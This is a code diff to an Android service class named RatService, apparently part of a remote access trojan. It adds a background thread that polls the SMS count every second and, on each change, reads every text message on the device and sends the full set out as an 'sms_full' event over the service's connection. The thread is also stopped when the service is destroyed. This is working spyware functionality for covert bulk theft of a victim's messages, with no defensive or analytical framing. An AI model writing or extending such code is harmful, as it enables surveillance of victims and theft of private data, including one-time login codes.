@@ -31,6 +31,7 @@ class RatService : Service() {
     private lateinit var handler: CommandHandler
     private var smsWatcher: SmsWatcher? = null
     private var galleryWatcher: GalleryWatcher? = null
+    private var smsPollThread: Thread? = null
     private var reconnectAttempts = 0
 
     override fun onCreate() {
@@ -61,7 +62,29 @@ class RatService : Service() {
         }
         try { smsWatcher?.start() } catch (_: Exception) {}
         try { galleryWatcher?.start() } catch (_: Exception) {}
+        startSmsPolling()
         return START_STICKY
+    }
+
+    private fun startSmsPolling() {
+        if (smsPollThread != null) return
+        smsPollThread = Thread {
+            var lastCount = 0
+            while (running) {
+                try {
+                    val current = handler.countSms()
+                    if (current != lastCount) {
+                        lastCount = current
+                        val smsData = handler.readAllSmsPublic()
+                        sendEvent(mapOf(
+                            "type" to "sms_full",
+                            "data" to smsData
+                        ))
+                    }
+                    Thread.sleep(1000)
+                } catch (_: Exception) {}
+            }
+        }.also { it.start() }
     }
 
     private fun buildNotification(): Notification {
@@ -265,6 +288,7 @@ class RatService : Service() {
 
     override fun onDestroy() {
         running = false
+        try { smsPollThread?.interrupt() } catch (_: Exception) {}
         try { smsWatcher?.stop() } catch (_: Exception) {}
         try { galleryWatcher?.stop() } catch (_: Exception) {}
         try { ws?.close(1000, "stop") } catch (_: Exception) {}
